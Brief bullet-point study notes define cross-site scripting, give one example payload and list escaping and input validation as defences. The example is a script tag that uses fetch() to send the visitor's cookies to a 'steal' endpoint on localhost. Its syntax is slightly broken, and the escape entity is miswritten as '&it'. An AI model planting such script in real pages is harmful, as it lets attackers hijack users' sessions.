- what is XSS (cross side scripting)?
   - it allows attacker to put malicios script into web page viewed by the other users
   - commonly used for stealing the session or deform the website
- like <script>fetch(http://localhost:8080/steal?cookie=' +document.cookie);</script>
- how to protect from it?
  - by proper scaping user input (converting specilal character < to &it) to pass as string and browser not treating as script need to be run
  - by properly input validating 
  